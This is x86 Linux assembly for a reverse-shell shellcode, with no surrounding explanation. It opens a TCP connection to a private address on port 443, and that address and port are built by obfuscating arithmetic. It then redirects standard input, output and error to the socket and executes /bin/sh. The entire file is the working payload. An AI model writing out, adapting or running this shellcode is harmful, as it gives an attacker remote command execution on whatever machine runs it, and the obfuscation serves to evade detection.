
global _start			

section .text
_start:
	xor    eax,eax
 	xor    ebx,ebx
 	xor    ecx,ecx
	xor    edx,edx
	mov    al,0x66
	mov    bl,0x1
	push   ecx
	push   0x6
	push   0x1
	push   0x2
	mov    ecx,esp
	int    0x80
	mov    esi,eax
	shl    eax,2
	shr    eax,4
	mov    al,0x66
	xor    ebx,ebx
	mov    bl,0x2
	mov    edi,0x1162317c
	add    edi,0x77667744
	mov    dword [esp-4],edi
	mov    cx, 0xbbbc
	add    cx, 0x1111
	sub    cx, 0x11cc
	mov    word [esp-6],cx
	sub esp,6
	push   bx
	inc    bl
	mov    ecx,esp
	push   0x10
	push   ecx
	push   esi
	mov    ecx,esp
	int    0x80
	xor    ecx,ecx
	mov    cl,0x3
dupfd:
	dec    cl
	mov    al,0x3f
	int    0x80
	jne    dupfd
	xor    eax,eax
	mov dword [esp-4],edx
	mov dword [esp-8],0x68732f6e
	mov dword [esp-12],0x69622f2f
	sub esp,12
	mov    ebx,esp
	push   edx
	push   ebx
	mov    ecx,esp
	push   edx
	mov    edx,esp
	mov    al,0xb
	int    0x80
